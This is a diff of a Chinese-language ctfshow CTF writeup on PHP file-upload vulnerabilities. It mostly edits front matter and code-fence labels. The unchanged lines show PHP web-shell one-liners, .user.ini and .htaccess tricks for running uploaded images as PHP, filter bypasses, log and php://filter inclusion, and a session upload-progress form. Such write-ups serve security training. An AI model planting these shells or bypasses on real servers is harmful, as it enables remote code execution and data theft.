@@ -2,18 +2,35 @@
 title: "ctfshow Web入门[文件上传] Writeup"
 date: 2022-08-03T14:29:48+08:00
 draft: false
-tags: ['ctf']
-categories: ['web']
 author: "X1r0z"
 
-# weight: 1  # Top page
+tags: ['ctf']
+categories: ['web']
 
-# You can also close(false) or open(true) something for this content.
-# P.S. comment can only be closed
-comment: false
-toc: false
-autoCollapseToc: false
+hiddenFromHomePage: false
+hiddenFromSearch: false
+twemoji: false
+lightgallery: true
+ruby: true
+fraction: true
+fontawesome: true
+linkToMarkdown: true
+rssFullText: false
+
+toc:
+  enable: true
+  auto: true
+code:
+  copy: true
+  maxShownLines: 50
+math:
+  enable: false
+share:
+  enable: true
+comment:
+  enable: true
 ---
+
 
 常见的上传漏洞
 
@@ -57,7 +74,7 @@ autoCollapseToc: false
 
 根据黑名单机制, 我们先上传图片马, 然后上传 `.user.ini`, 内容如下
 
-```
+```ini
 auto_append_file = "2.png"
 ```
 
@@ -75,7 +92,7 @@ auto_append_file = "2.png"
 
 将 php 改成 `=` 即可绕过 (或者 `php` 修改为大写)
 
-```
+```php
 <?= eval($_REQUEST['a']); ?>
 
 <?phP eval($_REQUEST['a']); ?>
@@ -89,7 +106,7 @@ auto_append_file = "2.png"
 
 `.user.ini` 改为如下内容
 
-```
+```ini
 auto_append_file = "2.png"
 short_open_tag = On
 ```
@@ -112,7 +129,7 @@ short_open_tag = On
 
 用 `{}` 绕过
 
-```
+```php
 <?= eval($_REQUEST{'a'}); ?>
 
 <?= eval($_REQUEST{1}); ?>
@@ -126,7 +143,7 @@ short_open_tag = On
 
 `php` 被过滤了, 但是可以用通配符 `*`
 
-```
+```php
 Gif89a
 <?= system('cat ../flag.*')?>
 ```
@@ -145,7 +162,7 @@ Gif89a
 
 用反引号绕过
 
-```
+```php
 <?= `cat ../flag.*`?>
 ```
 
@@ -159,14 +176,14 @@ nginx 默认日志地址为 `/var/log/nginx/access.log`
 
 默认格式
 
-```
+```log
 log_format access '$remote_addr – $remote_user [$time_local] "$request"' '$status $body_bytes_sent "$http_referer"' '"$http_user_agent" $http_x_forwarded_for';
 ```
 
 include
 
 注意 log 被过滤了, 需要拼接字符串
-```
+```php
 <?=include"/var/lo"."g/nginx/access.lo"."g"?>
 ```
 
@@ -174,7 +191,7 @@ include
 
 也可以用伪协议, 字符串拼接绕过过滤
 
-```
+```php
 <?=include"ph"."p://filter/convert.base64-encode/resource=../flag.ph"."p"?>
 ```
 
@@ -204,9 +221,9 @@ Content-Type, filename 文件头都是 gif 格式的竟然上传不了
 
 [https://www.php.net/manual/zh/session.upload-progress.php](https://www.php.net/manual/zh/session.upload-progress.php)
 
-php.in 相关配置
+php.ini 相关配置
 
-```
+```ini
 session.upload_progress.enabled = On
  
 session.upload_progress.prefix = "upload_progress_"
@@ -228,7 +245,7 @@ session.upload_progress.cleanup = On
 
 upload.html
 
-```
+```html
 <form action="http://9db88424-f6af-4562-8975-4d99539c2149.challenge.ctf.show/upload.php" method="POST" enctype="multipart/form-data">
 <input type="text" name="PHP_SESSION_UPLOAD_PROGRESS" value="xxx" />
 <input type="file" name="file" id="file" />
@@ -238,7 +255,7 @@ upload.html
 
 .user.ini
 
-```
+```ini
 GIF89a
 auto_prepend_file=/tmp/sess_123
 ```
@@ -288,7 +305,7 @@ imagecreatefrompng()
 
 这里直接贴 png payload 的代码
 
-```
+```php
 <?php
 $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
            0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
@@ -379,7 +396,7 @@ hint 是 httpd
 
 .htaccess
 
-```
+```htaccess
 <IfModule mime_module>
 AddType application/x-httpd-php .jpg
 </IfModule>
@@ -399,7 +416,7 @@ AddType application/x-httpd-php .jpg
 
 用 `$_REQUEST` 绕过
 
-```
+```php
 <?php $_REQUEST[1]($_REQUEST[2]);?>
 ```
 
